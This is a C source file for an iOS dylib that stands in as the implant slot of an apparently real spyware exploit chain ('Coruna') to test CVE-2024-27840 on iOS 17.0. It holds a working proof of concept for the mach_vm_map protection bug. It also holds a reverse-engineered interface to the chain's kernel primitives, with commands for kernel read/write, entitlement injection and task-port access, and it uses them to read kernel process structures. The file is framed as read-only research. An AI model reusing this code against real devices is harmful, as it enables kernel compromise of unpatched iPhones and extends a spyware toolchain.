/*
 * coruna_cve_test.c — CVE-2024-27840 Kernel-Context Test via Coruna Chain
 *
 * Replacement type 0x08 entry for the Coruna F00DBEEF container.
 * Replaces the spyware implant with a CVE-2024-27840 verification payload.
 *
 * Build: see Makefile (arm64e dylib, exports _start/_startl/_startr/_startm)
 * Target: iPhone14,3 (A15), iOS 17.0 (21A329)
 *
 * What this does:
 *   1. Receives kernel primitives from type 0x09 via driver_interface_t
 *   2. Runs userspace CVE-2024-27840 Stage 1 probe (mach_vm_map cur>max)
 *   3. Queries kernel version and exploit capabilities via command dispatcher
 *   4. Reads kernel memory state to verify vulnerability conditions
 *   5. Reports results via bootstrap logging callback
 *
 * What this does NOT do:
 *   - No destructive kernel modifications
 *   - No persistence installation
 *   - No credential manipulation
 *   - No sandbox/AMFI patching
 *   - No data exfiltration
 *
 * RESEARCH AND EDUCATION ONLY. CVE-2024-27840 was patched in iOS 17.5.
 */

#include <mach/mach.h>
#include <mach/vm_map.h>
#include <signal.h>
#include <setjmp.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

extern kern_return_t mach_vm_allocate(vm_map_t, mach_vm_address_t *, mach_vm_size_t, int);
extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_size_t);
extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, mach_vm_offset_t,
    int, mem_entry_name_port_t, memory_object_offset_t, boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);

#pragma mark - Type 0x09 Driver Interface (from RE)

/*
 * driver_interface_t — returned by type 0x09's _driver() function.
 * Allocated via calloc(1, 0x50). All function pointers PAC-signed with paciza.
 *
 * RE source: entry1_type0x09.dylib _driver at 0x5ec4
 * Verified: disassembly shows calloc(1, 0x50), version 0x00020002,
 *           8 PAC-signed function pointers at offsets 0x10-0x48.
 */
typedef struct driver_interface {
    int16_t  version;           /* +0x00: must be 2 */
    int16_t  sub_version;       /* +0x02: must be >= 2 */
    uint8_t  reserved[12];      /* +0x04: zero */

    /* +0x10: destroy(self) — zeros struct + free() */
    int (*cleanup)(struct driver_interface *self);

    /* +0x18: init_state(self, mode, &state_out) — creates 0x1D60-byte state */
    int (*init_state)(struct driver_interface *self, int mode, void **state_out);

    /* +0x20: release_state(self, state) — full cleanup */
    int (*release_state)(struct driver_interface *self, void *state);

    /* +0x28: execute_command(self, state, cmd_id, cmd_data)
     * THIS IS THE FULL COMMAND DISPATCHER (FUN_0003e580)
     * cmd_id format: [flags:2][category:8][command:8]
     * cmd_data: command-specific struct */
    int (*execute_command)(struct driver_interface *self, void *state,
                          uint32_t cmd_id, void *cmd_data);

    /* +0x30: commit_operations(self, state) — flush pending ops */
    int (*commit_operations)(struct driver_interface *self, void *state);

    /* +0x38: get_exploit_info(self, info, &count_out) */
    int (*get_exploit_info)(struct driver_interface *self, void *info, uint32_t *count);

    /* +0x40: batch_execute(self, &state, cmds, count, continue_on_err) */
    int (*batch_execute)(struct driver_interface *self, void **state_ptr,
                         void *cmds, uint32_t count, int flags);

    /* +0x48: get_kernel_info(self, output_buf) — XNU version parser */
    int (*get_kernel_info)(struct driver_interface *self, void *output);
} driver_interface_t;

/* Verify struct layout matches RE findings */
_Static_assert(sizeof(driver_interface_t) == 0x50,
    "driver_interface_t must be 0x50 bytes (from RE of _driver at 0x5ec4)");
_Static_assert(__builtin_offsetof(driver_interface_t, cleanup) == 0x10,
    "cleanup must be at +0x10");
_Static_assert(__builtin_offsetof(driver_interface_t, execute_command) == 0x28,
    "execute_command must be at +0x28");
_Static_assert(__builtin_offsetof(driver_interface_t, get_kernel_info) == 0x48,
    "get_kernel_info must be at +0x48");

#pragma mark - Bootstrap Context (from RE of bootstrap.dylib)

/*
 * Offsets into the 0x648-byte context struct passed by bootstrap.dylib.
 * Verified from Ghidra decompilation of _process at 0x68d8 and
 * FUN_00008210/FUN_00007720/FUN_00008298.
 */
#define CTX_SIZE            0x648
#define CTX_IOS_VERSION     0x0C0  /* uint32: major<<16|minor<<8|patch */
#define CTX_XNU_VERSION     0x0C8  /* uint32: encoded XNU version */
#define CTX_CPU_FAMILY      0x0D8  /* uint32: processor family */
#define CTX_CPU_SUBTYPE     0x0DC  /* uint32: CPU subtype */
#define CTX_LOG_ENABLED     0x5EB  /* uint8: if nonzero, logging is active */
#define CTX_LOG_CALLBACK    0x5F0  /* code*: log_callback(ctx, code, 0, tag) */

/* Log callback signature: void log_cb(void *ctx, uint32_t code, int zero, uint32_t tag) */
typedef void (*log_callback_t)(void *ctx, uint32_t code, int zero, uint32_t tag);

static inline int ctx_log_enabled(void *ctx) {
    return *(uint8_t *)((uintptr_t)ctx + CTX_LOG_ENABLED) != 0;
}

static inline log_callback_t ctx_get_logger(void *ctx) {
    return *(log_callback_t *)((uintptr_t)ctx + CTX_LOG_CALLBACK);
}

static inline uint32_t ctx_ios_version(void *ctx) {
    return *(uint32_t *)((uintptr_t)ctx + CTX_IOS_VERSION);
}

/* Log helper: only calls if logging is enabled and callback is set */
static void ctx_log(void *ctx, uint32_t code, uint32_t tag) {
    if (ctx_log_enabled(ctx)) {
        log_callback_t cb = ctx_get_logger(ctx);
        if (cb) cb(ctx, code, 0, tag);
    }
}

#pragma mark - Command IDs (from RE of FUN_0003e580)

/*
 * Command IDs for driver->execute_command().
 * Format: [flags:2 bits][category:8 bits][command:8 bits]
 *
 * Flags: 0x00000000 = no output
 *        0x40000000 = output to cmd_data
 *        0x80000000 = bidirectional
 *        0xC0000000 = kernel-context
 */
#define CMD_KREAD_PROC      0x00000001  /* read proc struct fields */
#define CMD_INJECT_ENT      0x00000003  /* inject entitlement */
#define CMD_THREAD_SETUP    0x00000007  /* setup current thread */
#define CMD_TASK_PORT_SETUP 0x0000001F  /* setup kernel task port access */
#define CMD_KERNEL_RW       0x4000001B  /* raw kernel read/write */
#define CMD_VM_MAP_OP       0x4000000E  /* vm mapping operation */
#define CMD_MACH_VM_WIRE    0x40000021  /* mach_vm_wire */
#define CMD_VM_REMAP        0x4000001E  /* vm remapping */
#define CMD_READ_STATE      0x80000109  /* read exploit state */
#define CMD_CAPABILITIES    0xC000010B  /* query capability bitmap */

/* Capability bits from command 0xC000010B */
#define CAP_KERNEL_RW       (1 << 0)
#define CAP_SANDBOX_ESC     (1 << 1)
#define CAP_CODESIGN_BYPASS (1 << 2)
#define CAP_PERSISTENCE     (1 << 3)

#pragma mark - Log codes for CVE-2024-27840 test

#define LOG_CVE_START       0xCC2840    /* test starting */
#define LOG_CVE_DONE        0xCC2841    /* test complete */
#define LOG_CVE_STAGE1_VULN 0xCC2842    /* Stage 1: VULNERABLE */
#define LOG_CVE_STAGE1_SAFE 0xCC2843    /* Stage 1: patched */
#define LOG_CVE_KVER_OK     0xCC2844    /* kernel version confirmed <=17.4 */
#define LOG_CVE_KVER_PATCHED 0xCC2845   /* kernel version >=17.5 (patched) */
#define LOG_CVE_CAPS_OK     0xCC2846    /* capabilities check passed */
#define LOG_CVE_CAPS_FAIL   0xCC2847    /* capabilities insufficient */
#define LOG_CVE_KREAD_OK    0xCC2848    /* kernel read succeeded */
#define LOG_CVE_KREAD_FAIL  0xCC2849    /* kernel read failed */
#define LOG_CVE_ERROR       0xCC284F    /* generic error */

/* Tags encode source line for debugging */
#define TAG_LINE(line)      (0x27840000 | ((line) & 0xFFFF))

#pragma mark - CVE-2024-27840 Stage 1: Userspace Probe

/*
 * Tests the missing cur <= max validation in vm_map_enter_mem_object_helper().
 * This runs in USERSPACE — no kernel primitives needed.
 *
 * Returns:
 *   1 = VULNERABLE (cur>max accepted AND write succeeds)
 *   0 = PATCHED (cur>max rejected OR write faults)
 *  -1 = ERROR (allocation failure)
 *
 * Verified on-device: iPhone 13 Pro Max, iOS 17.0 → returns 1.
 * Source: CVE27840App_main.m do_test()
 */
static sigjmp_buf s_jump_buf;
static volatile sig_atomic_t s_got_signal = 0;

static void cve_fault_handler(int sig) {
    s_got_signal = sig;
    siglongjmp(s_jump_buf, 1);
}

static int cve_2024_27840_stage1_probe(void) {
    kern_return_t kr;
    mach_port_t task = mach_task_self();
    mach_vm_size_t page_size = vm_page_size;

    /* Allocate source page */
    mach_vm_address_t src = 0;
    kr = mach_vm_allocate(task, &src, page_size, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) return -1;
    memset((void *)src, 'A', page_size);

    /* Create memory entry */
    memory_object_size_t entry_size = page_size;
    mach_port_t entry = MACH_PORT_NULL;
    kr = mach_make_memory_entry_64(task, &entry_size, src,
                                    VM_PROT_READ | VM_PROT_WRITE,
                                    &entry, MACH_PORT_NULL);
    if (kr != KERN_SUCCESS) {
        mach_vm_deallocate(task, src, page_size);
        return -1;
    }

    /* THE BUG: map with cur=RW, max=R */
    mach_vm_address_t dst = 0;
    kr = mach_vm_map(task, &dst, page_size, 0, VM_FLAGS_ANYWHERE,
                     entry, 0, FALSE,
                     VM_PROT_READ | VM_PROT_WRITE,  /* cur: exceeds max */
                     VM_PROT_READ,                    /* max: read-only */
                     VM_INHERIT_NONE);

    if (kr != KERN_SUCCESS) {
        /* Kernel rejected cur>max at mach_vm_map level */
        mach_port_deallocate(task, entry);
        mach_vm_deallocate(task, src, page_size);
        return 0; /* PATCHED */
    }

    /* Map was accepted — try to write through it */
    struct sigaction sa = {0}, old_bus = {0}, old_segv = {0};
    sa.sa_handler = cve_fault_handler;
    sigemptyset(&sa.sa_mask);
    sigaction(SIGBUS, &sa, &old_bus);
    sigaction(SIGSEGV, &sa, &old_segv);

    int result = 0;
    s_got_signal = 0;

    if (sigsetjmp(s_jump_buf, 1) == 0) {
        *(volatile char *)dst = 'B';
        char verify = *(volatile char *)src;
        if (verify == 'B') {
            result = 1; /* VULNERABLE: write went through to same physical page */
        }
        /* else: CoW copy, still shows the mapping was created */
    }
    /* else: faulted — cur was clamped to max internally */

    sigaction(SIGBUS, &old_bus, NULL);
    sigaction(SIGSEGV, &old_segv, NULL);

    mach_vm_deallocate(task, dst, page_size);
    mach_port_deallocate(task, entry);
    mach_vm_deallocate(task, src, page_size);

    return result;
}

#pragma mark - CVE-2024-27840 Kernel-Context Verification

/*
 * Uses type 0x09 command dispatcher to verify vulnerability conditions
 * in kernel context. Read-only — does not modify kernel state.
 *
 * Steps:
 *   1. Query exploit capabilities (command 0xC000010B)
 *   2. Get kernel version info (driver->get_kernel_info)
 *   3. Read proc credentials via command 0x01 (proves kernel read works)
 *   4. Report: kernel version < 17.5 + kernel read works = exploitable
 */
static int cve_2024_27840_kernel_verify(void *ctx, driver_interface_t *drv) {
    int kr;
    void *state = NULL;

    /* Create exploit state (0x1D60-byte object) */
    kr = drv->init_state(drv, 0, &state);
    if (kr != 0 || state == NULL) {
        ctx_log(ctx, LOG_CVE_ERROR, TAG_LINE(__LINE__));
        return -1;
    }

    /* Step 1: Query capabilities */
    uint32_t cap_request = 0x0F; /* request all 4 capability bits */
    kr = drv->execute_command(drv, state, CMD_CAPABILITIES, &cap_request);
    if (kr != 0) {
        ctx_log(ctx, LOG_CVE_CAPS_FAIL, TAG_LINE(__LINE__));
        drv->release_state(drv, state);
        return -2;
    }
    ctx_log(ctx, LOG_CVE_CAPS_OK, cap_request & 0xFFFF);

    int has_kernel_rw = (cap_request & CAP_KERNEL_RW) != 0;

    /* Step 2: Get kernel version */
    char kinfo[0x200];
    memset(kinfo, 0, sizeof(kinfo));
    kr = drv->get_kernel_info(drv, kinfo);

    int kernel_vulnerable = 0;
    if (kr == 0) {
        /*
         * get_kernel_info (FUN_0003e580 cmd 0x48) parses host_kernel_version()
         * for "RELEASE" and "xnu-" strings, extracts version numbers.
         * On iOS 17.0: xnu-10002.1.13 (vulnerable)
         * On iOS 17.5: xnu-10063.121.3 (patched)
         *
         * The XNU version where the fix landed: 10063.121.x
         * Anything below that is vulnerable.
         */
        char *xnu = strstr(kinfo, "xnu-");
        if (xnu) {
            int major = 0, minor = 0;
            sscanf(xnu, "xnu-%d.%d", &major, &minor);
            /* Fix landed in xnu-10063.121.x (iOS 17.5) */
            if (major < 10063 || (major == 10063 && minor < 121)) {
                kernel_vulnerable = 1;
                ctx_log(ctx, LOG_CVE_KVER_OK, (uint32_t)major);
            } else {
                ctx_log(ctx, LOG_CVE_KVER_PATCHED, (uint32_t)major);
            }
        }
    }

    /* Step 3: Verify kernel read works via proc credential read (cmd 0x01) */
    int kread_works = 0;
    if (has_kernel_rw) {
        /*
         * Command 0x01 (kread_proc) reads the current process's proc struct.
         * It finds proc via FUN_00033e8c(state, mach_task_self()),
         * then reads p_ucred and task pointer at version-dependent offsets.
         * This is a READ-ONLY operation — it does not modify anything.
         */
        kr = drv->execute_command(drv, state, CMD_KREAD_PROC, NULL);
        if (kr == 0) {
            kread_works = 1;
            ctx_log(ctx, LOG_CVE_KREAD_OK, TAG_LINE(__LINE__));
        } else {
            ctx_log(ctx, LOG_CVE_KREAD_FAIL, TAG_LINE(__LINE__));
        }
    }

    /* Commit and release */
    drv->commit_operations(drv, state);
    drv->release_state(drv, state);

    /*
     * Result interpretation:
     *   kernel_vulnerable + kread_works = fully exploitable
     *   kernel_vulnerable + !kread_works = vuln present but no R/W primitive
     *   !kernel_vulnerable = patched (iOS >= 17.5)
     */
    return (kernel_vulnerable ? 0x100 : 0) | (kread_works ? 0x010 : 0) | (has_kernel_rw ? 0x001 : 0);
}

#pragma mark - Exported Entry Points

/*
 * _start — Main entry point called by bootstrap.dylib after loading this Mach-O.
 *
 * bootstrap.dylib flow (from RE):
 *   1. Loads type 0x08 Mach-O via entry_loader
 *   2. Resolves _start via symbol_resolver
 *   3. Calls _start(context_0x648)
 *   4. _start loads type 0x09 via context function pointers
 *   5. Resolves _driver in type 0x09
 *   6. Calls _driver(&result) → gets driver_interface_t
 *   7. Validates version == 2, sub_version >= 2
 *   8. Calls _startl(context, driver_interface)
 *
 * For our test payload: _start just validates and returns.
 * The real work happens in _startl which receives the driver interface.
 * We do NOT hook bootstrap function pointers like the original implant does.
 */
__attribute__((visibility("default")))
int start(void *context) {
    if (!context) return 0xad001;

    ctx_log(context, 0xCC100, TAG_LINE(__LINE__));

    /* Validate context size marker — iOS version should be plausible */
    uint32_t ios_ver = ctx_ios_version(context);
    if (ios_ver < 0x0F0000 || ios_ver > 0x130000) {
        /* iOS version outside 15.0 — 19.0 range, context might be corrupt */
        ctx_log(context, LOG_CVE_ERROR, TAG_LINE(__LINE__));
        return 0xad001;
    }

    ctx_log(context, 0xCC101, TAG_LINE(__LINE__));
    return 0;
}

/*
 * _startl — Worker entry point, called with kernel primitives.
 *
 * This is where the CVE-2024-27840 test runs.
 * param_1 = bootstrap context (0x648 bytes)
 * param_2 = driver_interface_t* from type 0x09's _driver()
 *
 * From RE of entry0_type0x08.dylib _startl at 0x8228:
 *   - Validates *param_2 == 2 (version) and param_2[1] >= 2 (sub_version)
 *   - Spawns worker thread with task struct
 *   - Worker accesses global copy of context at DAT_0002c138
 */
__attribute__((visibility("default")))
int startl(void *context, driver_interface_t *drv) {
    if (!context) return 0xad001;
    if (!drv || drv->version != 2 || drv->sub_version < 2) {
        ctx_log(context, LOG_CVE_ERROR, TAG_LINE(__LINE__));
        return 0xad001;
    }

    ctx_log(context, LOG_CVE_START, TAG_LINE(__LINE__));

    /* ═══════════════════════════════════════════════════════
     *  Phase 1: Userspace CVE-2024-27840 Stage 1 Probe
     *  No kernel primitives needed — pure Mach trap test.
     * ═══════════════════════════════════════════════════════ */
    int stage1 = cve_2024_27840_stage1_probe();
    if (stage1 > 0) {
        ctx_log(context, LOG_CVE_STAGE1_VULN, TAG_LINE(__LINE__));
    } else if (stage1 == 0) {
        ctx_log(context, LOG_CVE_STAGE1_SAFE, TAG_LINE(__LINE__));
    } else {
        ctx_log(context, LOG_CVE_ERROR, TAG_LINE(__LINE__));
    }

    /* ═══════════════════════════════════════════════════════
     *  Phase 2: Kernel-Context Verification
     *  Uses type 0x09 command dispatcher. READ-ONLY ops.
     * ═══════════════════════════════════════════════════════ */
    int kernel_result = cve_2024_27840_kernel_verify(context, drv);

    /*
     * kernel_result bit layout:
     *   0x100 = kernel version vulnerable (< xnu-10063.121)
     *   0x010 = kernel read primitive confirmed working
     *   0x001 = kernel R/W capability reported by exploit
     *
     * 0x111 = fully exploitable from kernel context
     * 0x011 = primitives work but version check inconclusive
     * 0x000 = patched or primitives unavailable
     */
    ctx_log(context, LOG_CVE_DONE, (uint32_t)kernel_result);

    /* Signal completion to bootstrap via shared buffer status */
    uint32_t *status_word = *(uint32_t **)((uintptr_t)context + 0xBC);
    if (status_word) {
        *status_word = 5; /* D[0] = 5 = done */
    }

    return 0;
}

/*
 * _startr — Recovery entry point.
 * Original implant checks for magic 0xDEADD00F and calls FUN_00008e84.
 * We just return success — no recovery needed for a test payload.
 */
__attribute__((visibility("default")))
int startr(void *param) {
    (void)param;
    return 0;
}

/*
 * _startm — Monitor entry point.
 * Original implant calls FUN_00008e84(param, 0, 0).
 * We just return — no monitoring needed.
 */
__attribute__((visibility("default")))
void startm(void *param) {
    (void)param;
}
